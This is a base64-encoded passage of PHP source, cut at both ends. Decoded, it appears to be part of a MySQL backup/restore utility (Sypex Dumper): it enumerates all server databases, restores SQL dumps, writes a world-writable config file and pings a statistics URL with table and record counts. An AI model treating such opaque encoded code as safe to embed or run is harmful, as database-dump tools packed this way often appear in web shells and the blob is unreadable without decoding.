CAgICAgICAgICAgICAgICAgICAgICAgJGxhc3RfY2hhcnNldCA9ICRjaGFyc2V0WzJdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2V7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNhY2hlIC49IHRwbF9sKCfQmtC+0LTQuNGA0L7QstC60LAg0YHQvtC10LTQuNC90LXQvdC40Y8g0Lgg0YLQsNCx0LvQuNGG0Ysg0L3QtSDRgdC+0LLQv9Cw0LTQsNC10YI6JywgQ19FUlJPUik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNhY2hlIC49IHRwbF9sKCfQotCw0LHQu9C40YbQsCBgJy4gJHRhYmxlIC4nYCAtPiAnIC4gJGNoYXJzZXRbMl0gLiAnICjRgdC+0LXQtNC40L3QtdC90LjQtSAnICAuICR0aGlzLT5yZXN0b3JlX2NoYXJzZXQgLiAnKScsIENfRVJST1IpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyDQnNC10L3Rj9C10Lwg0LrQvtC00LjRgNC+0LLQutGDINC10YHQu9C4INGD0LrQsNC30LDQvdC+INGE0L7RgNGB0LjRgNC+0LLQsNGC0Ywg0LrQvtC00LjRgNC+0LLQutGDCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPmZvcmNlZF9jaGFyc2V0KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzcWwgPSBwcmVnX3JlcGxhY2UoIi8oXC9cKiFcZCtccyk/KChDT0xMQVRFKVs9XHNdKylcdysoXHMrXCpcLyk/L2kiLCAnJywgJHNxbCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzcWwgPSBwcmVnX3JlcGxhY2UoIi8oKENIQVJBQ1RFUiBTRVR8Q0hBUlNFVClbPVxzXSspXHcrL2kiLCAiXFwxIiAuICR0aGlzLT5yZXN0b3JlX2NoYXJzZXQgLiAkdGhpcy0+cmVzdG9yZV9jb2xsYXRlLCAkc3FsKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZWlmKENIQVJTRVQgPT0gJ2F1dG8nKXsgLy8g0JLRgdGC0LDQstC70Y/QtdC8INC60L7QtNC40YDQvtCy0LrRgyDQtNC70Y8g0YLQsNCx0LvQuNGGLCDQtdGB0LvQuCDQvtC90LAg0L3QtSDRg9C60LDQt9Cw0L3QsCDQuCDRg9GB0YLQsNC90L7QstC70LXQvdCwIGF1dG8g0LrQvtC00LjRgNC+0LLQutCwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc3FsIC49ICcgREVGQVVMVCBDSEFSU0VUPScgLiAkdGhpcy0+cmVzdG9yZV9jaGFyc2V0IC4gJHRoaXMtPnJlc3RvcmVfY29sbGF0ZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+cmVzdG9yZV9jaGFyc2V0ICE9ICRsYXN0X2NoYXJzZXQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbXlzcWxfcXVlcnkoIlNFVCBOQU1FUyAnIiAuICR0aGlzLT5yZXN0b3JlX2NoYXJzZXQgLiAiJyIpIG9yIHRyaWdnZXJfZXJyb3IgKCLQndC10YPQtNCw0LXRgtGB0Y8g0LjQt9C80LXQvdC40YLRjCDQutC+0LTQuNGA0L7QstC60YMg0YHQvtC10LTQuNC90LXQvdC40Y8uPEJSPnskc3FsfTxCUj4iIC4gbXlzcWxfZXJyb3IoKSwgRV9VU0VSX0VSUk9SKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNhY2hlIC49IHRwbF9sKCLQo9GB0YLQsNC90L7QstC70LXQvdCwINC60L7QtNC40YDQvtCy0LrQsCDRgdC+0LXQtNC40L3QtdC90LjRjyBgIiAuICR0aGlzLT5yZXN0b3JlX2NoYXJzZXQgLiAiYC4iLCBDX1dBUk5JTkcpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGFzdF9jaGFyc2V0ID0gJHRoaXMtPnJlc3RvcmVfY2hhcnNldDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRsYXN0X3Nob3dlZCAhPSAkdGFibGUpIHskY2FjaGUgLj0gdHBsX2woItCi0LDQsdC70LjRhtCwIGB7JHRhYmxlfWAuIik7ICRsYXN0X3Nob3dlZCA9ICR0YWJsZTt9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYoJHRoaXMtPm15c3FsX3ZlcnNpb24gPiA0MDEwMSAmJiBlbXB0eSgkbGFzdF9jaGFyc2V0KSkgeyAvLyDQo9GB0YLQsNC90LDQstC70LjQstCw0LXQvCDQutC+0LTQuNGA0L7QstC60YMg0L3QsCDRgdC70YPRh9Cw0Lkg0LXRgdC70Lgg0L7RgtGB0YPRgtGB0YLQstGD0LXRgiBDUkVBVEUgVEFCTEUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbXlzcWxfcXVlcnkoIlNFVCAkdGhpcy0+cmVzdG9yZV9jaGFyc2V0ICciIC4gJHRoaXMtPnJlc3RvcmVfY2hhcnNldCAuICInIikgb3IgdHJpZ2dlcl9lcnJvciAoItCd0LXRg9C00LDQtdGC0YHRjyDQuNC30LzQtdC90LjRgtGMINC60L7QtNC40YDQvtCy0LrRgyDRgdC+0LXQtNC40L3QtdC90LjRjy48QlI+eyRzcWx9PEJSPiIgLiBteXNxbF9lcnJvcigpLCBFX1VTRVJfRVJST1IpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvIHRwbF9sKCLQo9GB0YLQsNC90L7QstC70LXQvdCwINC60L7QtNC40YDQvtCy0LrQsCDRgdC+0LXQtNC40L3QtdC90LjRjyBgIiAuICR0aGlzLT5yZXN0b3JlX2NoYXJzZXQgLiAiYC4iLCBDX1dBUk5JTkcpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGFzdF9jaGFyc2V0ID0gJHRoaXMtPnJlc3RvcmVfY2hhcnNldDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgJGluc2VydCA9ICcnOwogICAgICAgICAgICAgICAgICAgICRleGVjdXRlID0gMTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkcXVlcnlfbGVuID49IDY1NTM2ICYmIHByZWdfbWF0Y2goIi8sJC8iLCAkc3RyKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkc3FsID0gcnRyaW0oJGluc2VydCAuICRzcWwsICIsIik7CiAgICAgICAgICAgICAgICAgICAgJGV4ZWN1dGUgPSAxOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGV4ZWN1dGUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJHErKzsKICAgICAgICAgICAgICAgICAgICAgICAgbXlzcWxfcXVlcnkoJHNxbCkgb3IgdHJpZ2dlcl9lcnJvciAoIldyb25nIHF1ZXJyeS48QlI+IiAuIG15c3FsX2Vycm9yKCksIEVfVVNFUl9FUlJPUik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAocHJlZ19tYXRjaCgiL15pbnNlcnQvaSIsICRzcWwpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkYWZmX3Jvd3MgKz0gbXlzcWxfYWZmZWN0ZWRfcm93cygpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICRzcWwgPSAnJzsKICAgICAgICAgICAgICAgICAgICAgICAgJHF1ZXJ5X2xlbiA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgICRleGVjdXRlID0gMDsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWNobyAkY2FjaGU7CiAgICAgICAgICAgICAgICBlY2hvIHRwbF9zKDEgLCAxKTsKICAgICAgICAgICAgICAgIGVjaG8gdHBsX2woc3RyX3JlcGVhdCgiLSIsIDYwKSk7CiAgICAgICAgICAgICAgICBlY2hvIHRwbF9sKCJEQiB3YXMgcmVzdG9yZWQgZnJvbSBiYWNrdXAuIiwgQ19SRVNVTFQpOwogICAgICAgICAgICAgICAgaWYgKGlzc2V0KCRpbmZvWzNdKSkgZWNobyB0cGxfbCgi0JTQsNGC0LAg0YHQvtC30LTQsNC90LjRjyDQutC+0L/QuNC4OiB7JGluZm9bM119IiwgQ19SRVNVTFQpOwogICAgICAgICAgICAgICAgZWNobyB0cGxfbCgiREIgcXVlcmllczogeyRxfSIsIENfUkVTVUxUKTsKICAgICAgICAgICAgICAgIGVjaG8gdHBsX2woIlRhYmxlcyB3YXMgY3JlYXRlZDogeyR0YWJzfSIsIENfUkVTVUxUKTsKICAgICAgICAgICAgICAgIGVjaG8gdHBsX2woItCh0YLRgNC+0Log0LTQvtCx0LDQstC70LXQvdC+OiB7JGFmZl9yb3dzfSIsIENfUkVTVUxUKTsKCiAgICAgICAgICAgICAgICAkdGhpcy0+dGFicyA9ICR0YWJzOwogICAgICAgICAgICAgICAgJHRoaXMtPnJlY29yZHMgPSAkYWZmX3Jvd3M7CiAgICAgICAgICAgICAgICAkdGhpcy0+c2l6ZSA9IGZpbGVzaXplKFBBVEggLiAkdGhpcy0+ZmlsZW5hbWUpOwogICAgICAgICAgICAgICAgJHRoaXMtPmNvbXAgPSAkdGhpcy0+U0VUWydjb21wX21ldGhvZCddICogMTAgKyAkdGhpcy0+U0VUWydjb21wX2xldmVsJ107CiAgICAgICAgICAgICAgICBlY2hvICI8U0NSSVBUPmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdiYWNrJykuZGlzYWJsZWQgPSAwOzwvU0NSSVBUPiI7CiAgICAgICAgICAgICAgICAvLyDQn9C10YDQtdC00LDRh9CwINC00LDQvdC90YvRhSDQtNC70Y8g0LPQu9C+0LHQsNC70YzQvdC+0Lkg0YHRgtCw0YLQuNGB0YLQuNC60LgKICAgICAgICAgICAgICAgIGlmIChHUykgZWNobyAiPFNDUklQVD5kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnR1MnKS5zcmMgPSAnaHR0cDovL3N5cGV4Lm5ldC9ncy5waHA/cj17JHRoaXMtPnRhYnN9LHskdGhpcy0+cmVjb3Jkc30seyR0aGlzLT5zaXplfSx7JHRoaXMtPmNvbXB9LDEwOCc7PC9TQ1JJUFQ+IjsKCiAgICAgICAgICAgICAgICAkdGhpcy0+Zm5fY2xvc2UoJGZwKTsKICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIG1haW4oKXsKICAgICAgICAgICAgICAgICR0aGlzLT5jb21wX2xldmVscyA9IGFycmF5KCc5JyA9PiAnOSAo0LzQsNC60YHQuNC80LDQu9GM0L3QsNGPKScsICc4JyA9PiAnOCcsICc3JyA9PiAnNycsICc2JyA9PiAnNicsICc1JyA9PiAnNSAo0YHRgNC10LTQvdGP0Y8pJywgJzQnID0+ICc0JywgJzMnID0+ICczJywgJzInID0+ICcyJywgJzEnID0+ICcxICjQvNC40L3QuNC80LDQu9GM0L3QsNGPKScsJzAnID0+ICfQkdC10Lcg0YHQttCw0YLQuNGPJyk7CgogICAgICAgICAgICAgICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygiYnpvcGVuIikpIHsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+Y29tcF9tZXRob2RzWzJdID0gJ0JaaXAyJzsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmIChmdW5jdGlvbl9leGlzdHMoImd6b3BlbiIpKSB7CiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmNvbXBfbWV0aG9kc1sxXSA9ICdHWmlwJzsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICR0aGlzLT5jb21wX21ldGhvZHNbMF0gPSAn0JHQtdC3INGB0LbQsNGC0LjRjyc7CiAgICAgICAgICAgICAgICBpZiAoY291bnQoJHRoaXMtPmNvbXBfbWV0aG9kcykgPT0gMSkgewogICAgICAgICAgICAgICAgICAgICR0aGlzLT5jb21wX2xldmVscyA9IGFycmF5KCcwJyA9PifQkdC10Lcg0YHQttCw0YLQuNGPJyk7CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgJGRicyA9ICR0aGlzLT5kYl9zZWxlY3QoKTsKICAgICAgICAgICAgICAgICR0aGlzLT52YXJzWydkYl9iYWNrdXAnXSAgICA9ICR0aGlzLT5mbl9zZWxlY3QoJGRicywgJHRoaXMtPlNFVFsnbGFzdF9kYl9iYWNrdXAnXSk7CiAgICAgICAgICAgICAgICAkdGhpcy0+dmFyc1snZGJfcmVzdG9yZSddICAgPSAkdGhpcy0+Zm5fc2VsZWN0KCRkYnMsICR0aGlzLT5TRVRbJ2xhc3RfZGJfcmVzdG9yZSddKTsKICAgICAgICAgICAgICAgICR0aGlzLT52YXJzWydjb21wX2xldmVscyddICA9ICR0aGlzLT5mbl9zZWxlY3QoJHRoaXMtPmNvbXBfbGV2ZWxzLCAkdGhpcy0+U0VUWydjb21wX2xldmVsJ10pOwogICAgICAgICAgICAgICAgJHRoaXMtPnZhcnNbJ2NvbXBfbWV0aG9kcyddID0gJHRoaXMtPmZuX3NlbGVjdCgkdGhpcy0+Y29tcF9tZXRob2RzLCAkdGhpcy0+U0VUWydjb21wX21ldGhvZCddKTsKICAgICAgICAgICAgICAgICR0aGlzLT52YXJzWyd0YWJsZXMnXSAgICAgICA9ICR0aGlzLT5TRVRbJ3RhYmxlcyddOwogICAgICAgICAgICAgICAgJHRoaXMtPnZhcnNbJ2ZpbGVzJ10gICAgICAgID0gJHRoaXMtPmZuX3NlbGVjdCgkdGhpcy0+ZmlsZV9zZWxlY3QoKSwgJycpOwogICAgICAgICAgICAgICAgZ2xvYmFsICRkdW1wZXJfZmlsZTsKICAgICAgICAgICAgICAgICRidXR0b25zID0gIjxJTlBVVCBUWVBFPXN1Ym1pdCBWQUxVRT1BcHBseT48SU5QVVQgVFlQRT1idXR0b24gVkFMVUU9RXhpdCBvbkNsaWNrPVwibG9jYXRpb24uaHJlZiA9ICciLiRkdW1wZXJfZmlsZS4iP3JlbG9hZCdcIj4iOwogICAgICAgICAgICAgICAgZWNobyB0cGxfcGFnZSh0cGxfbWFpbigpLCAkYnV0dG9ucyk7CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBkYl9zZWxlY3QoKXsKICAgICAgICAgICAgICAgIGlmIChEQk5BTUVTICE9ICcnKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRpdGVtcyA9IGV4cGxvZGUoJywnLCB0cmltKERCTkFNRVMpKTsKICAgICAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCgkaXRlbXMgQVMgJGl0ZW0pewogICAgICAgICAgICAgICAgICAgICAgICBpZiAobXlzcWxfc2VsZWN0X2RiKCRpdGVtKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0YWJsZXMgPSBteXNxbF9xdWVyeSgiU0hPVyBUQUJMRVMiKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJHRhYmxlcykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGFicyA9IG15c3FsX251bV9yb3dzKCR0YWJsZXMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGRic1skaXRlbV0gPSAieyRpdGVtfSAoeyR0YWJzfSkiOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRyZXN1bHQgPSBteXNxbF9xdWVyeSgiU0hPVyBEQVRBQkFTRVMiKTsKICAgICAgICAgICAgICAgICRkYnMgPSBhcnJheSgpOwogICAgICAgICAgICAgICAgd2hpbGUoJGl0ZW0gPSBteXNxbF9mZXRjaF9hcnJheSgkcmVzdWx0KSl7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChteXNxbF9zZWxlY3RfZGIoJGl0ZW1bMF0pKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRhYmxlcyA9IG15c3FsX3F1ZXJ5KCJTSE9XIFRBQkxFUyIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkdGFibGVzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0YWJzID0gbXlzcWxfbnVtX3Jvd3MoJHRhYmxlcyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZGJzWyRpdGVtWzBdXSA9ICJ7JGl0ZW1bMF19ICh7JHRhYnN9KSI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiAkZGJzOwogICAgICAgIH0KCiAgICAgICAgZnVuY3Rpb24gZmlsZV9zZWxlY3QoKXsKICAgICAgICAgICAgICAgICRmaWxlcyA9IGFycmF5KCcnID0+ICcgJyk7CiAgICAgICAgICAgICAgICBpZiAoaXNfZGlyKFBBVEgpICYmICRoYW5kbGUgPSBvcGVuZGlyKFBBVEgpKSB7CiAgICAgICAgICAgIHdoaWxlIChmYWxzZSAhPT0gKCRmaWxlID0gcmVhZGRpcigkaGFuZGxlKSkpIHsKICAgICAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCIvXi4rP1wuc3FsKFwuKGd6fGJ6MikpPyQvIiwgJGZpbGUpKSB7CiAgICAgICAgICAgICAgICAgICAgJGZpbGVzWyRmaWxlXSA9ICRmaWxlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNsb3NlZGlyKCRoYW5kbGUpOwogICAgICAgIH0KICAgICAgICBrc29ydCgkZmlsZXMpOwogICAgICAgICAgICAgICAgcmV0dXJuICRmaWxlczsKICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIGZuX29wZW4oJG5hbWUsICRtb2RlKXsKICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+U0VUWydjb21wX21ldGhvZCddID09IDIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmZpbGVuYW1lID0gInskbmFtZX0uc3FsLmJ6MiI7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGJ6b3BlbihQQVRIIC4gJHRoaXMtPmZpbGVuYW1lLCAieyRtb2RlfWJ7JHRoaXMtPlNFVFsnY29tcF9sZXZlbCddfSIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmICgkdGhpcy0+U0VUWydjb21wX21ldGhvZCddID09IDEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmZpbGVuYW1lID0gInskbmFtZX0uc3FsLmd6IjsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gZ3pvcGVuKFBBVEggLiAkdGhpcy0+ZmlsZW5hbWUsICJ7JG1vZGV9YnskdGhpcy0+U0VUWydjb21wX2xldmVsJ119Iik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlewogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZmlsZW5hbWUgPSAieyRuYW1lfS5zcWwiOwogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZm9wZW4oUEFUSCAuICR0aGlzLT5maWxlbmFtZSwgInskbW9kZX1iIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBmbl93cml0ZSgkZnAsICRzdHIpewogICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5TRVRbJ2NvbXBfbWV0aG9kJ10gPT0gMikgewogICAgICAgICAgICAgICAgICAgIGJ6d3JpdGUoJGZwLCAkc3RyKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2VpZiAoJHRoaXMtPlNFVFsnY29tcF9tZXRob2QnXSA9PSAxKSB7CiAgICAgICAgICAgICAgICAgICAgZ3p3cml0ZSgkZnAsICRzdHIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZXsKICAgICAgICAgICAgICAgICAgICAgICAgZndyaXRlKCRmcCwgJHN0cik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBmbl9yZWFkKCRmcCl7CiAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPlNFVFsnY29tcF9tZXRob2QnXSA9PSAyKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGJ6cmVhZCgkZnAsIDQwOTYpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmICgkdGhpcy0+U0VUWydjb21wX21ldGhvZCddID09IDEpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gZ3pyZWFkKCRmcCwgNDA5Nik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlewogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZnJlYWQoJGZwLCA0MDk2KTsKICAgICAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIGZuX3JlYWRfc3RyKCRmcCl7CiAgICAgICAgICAgICAgICAkc3RyaW5nID0gJyc7CiAgICAgICAgICAgICAgICAkdGhpcy0+ZmlsZV9jYWNoZSA9IGx0cmltKCR0aGlzLT5maWxlX2NhY2hlKTsKICAgICAgICAgICAgICAgICRwb3MgPSBzdHJwb3MoJHRoaXMtPmZpbGVfY2FjaGUsICJcbiIsIDApOwogICAgICAgICAgICAgICAgaWYgKCRwb3MgPCAxKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlICghJHN0cmluZyAmJiAoJHN0ciA9ICR0aGlzLT5mbl9yZWFkKCRmcCkpKXsKICAgICAgICAgICAgICAgICAgICAgICAgJHBvcyA9IHN0cnBvcygkc3RyLCAiXG4iLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRwb3MgPT09IGZhbHNlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZmlsZV9jYWNoZSAuPSAkc3RyOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2V7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHN0cmluZyA9ICR0aGlzLT5maWxlX2NhY2hlIC4gc3Vic3RyKCRzdHIsIDAsICRwb3MgKyAxKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZmlsZV9jYWNoZSA9IHN1YnN0cigkc3RyLCAkcG9zICsgMSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCEkc3RyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPmZpbGVfY2FjaGUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzdHJpbmcgPSAkdGhpcy0+ZmlsZV9jYWNoZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5maWxlX2NhY2hlID0gJyc7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiB0cmltKCRzdHJpbmcpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRzdHJpbmcgPSBzdWJzdHIoJHRoaXMtPmZpbGVfY2FjaGUsIDAsICRwb3MpOwogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZmlsZV9jYWNoZSA9IHN1YnN0cigkdGhpcy0+ZmlsZV9jYWNoZSwgJHBvcyArIDEpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgcmV0dXJuIHRyaW0oJHN0cmluZyk7CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBmbl9jbG9zZSgkZnApewogICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5TRVRbJ2NvbXBfbWV0aG9kJ10gPT0gMikgewogICAgICAgICAgICAgICAgICAgIGJ6Y2xvc2UoJGZwKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2VpZiAoJHRoaXMtPlNFVFsnY29tcF9tZXRob2QnXSA9PSAxKSB7CiAgICAgICAgICAgICAgICAgICAgZ3pjbG9zZSgkZnApOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZXsKICAgICAgICAgICAgICAgICAgICAgICAgZmNsb3NlKCRmcCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBAY2htb2QoUEFUSCAuICR0aGlzLT5maWxlbmFtZSwgMDY2Nik7CiAgICAgICAgICAgICAgICAkdGhpcy0+Zm5faW5kZXgoKTsKICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIGZuX3NlbGVjdCgkaXRlbXMsICRzZWxlY3RlZCl7CiAgICAgICAgICAgICAgICAkc2VsZWN0ID0gJyc7CiAgICAgICAgICAgICAgICBmb3JlYWNoKCRpdGVtcyBBUyAka2V5ID0+ICR2YWx1ZSl7CiAgICAgICAgICAgICAgICAgICAgICAgICRzZWxlY3QgLj0gJGtleSA9PSAkc2VsZWN0ZWQgPyAiPE9QVElPTiBWQUxVRT0neyRrZXl9JyBTRUxFQ1RFRD57JHZhbHVlfSIgOiAiPE9QVElPTiBWQUxVRT0neyRrZXl9Jz57JHZhbHVlfSI7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICByZXR1cm4gJHNlbGVjdDsKICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIGZuX3NhdmUoKXsKICAgICAgICAgICAgICAgIGlmIChTQykgewogICAgICAgICAgICAgICAgICAgICAgICAkbmUgPSAhZmlsZV9leGlzdHMoUEFUSCAuICJkdW1wZXIuY2ZnLnBocCIpOwogICAgICAgICAgICAgICAgICAgICRmcCA9IGZvcGVuKFBBVEggLiAiZHVtcGVyLmNmZy5waHAiLCAid2IiKTsKICAgICAgICAgICAgICAgIGZ3cml0ZSgkZnAsICI8P3BocFxuXCR0aGlzLT5TRVQgPSAiIC4gZm5fYXJyMnN0cigkdGhpcy0+U0VUKSAuICJcbj8+Iik7CiAgICAgICAgICAgICAgICBmY2xvc2UoJGZwKTsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRuZSkgQGNobW9kKFBBVEggLiAiZHVtcGVyLmNmZy5waHAiLCAwNjY2KTsKICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmZuX2luZGV4KCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBmbl9pbmR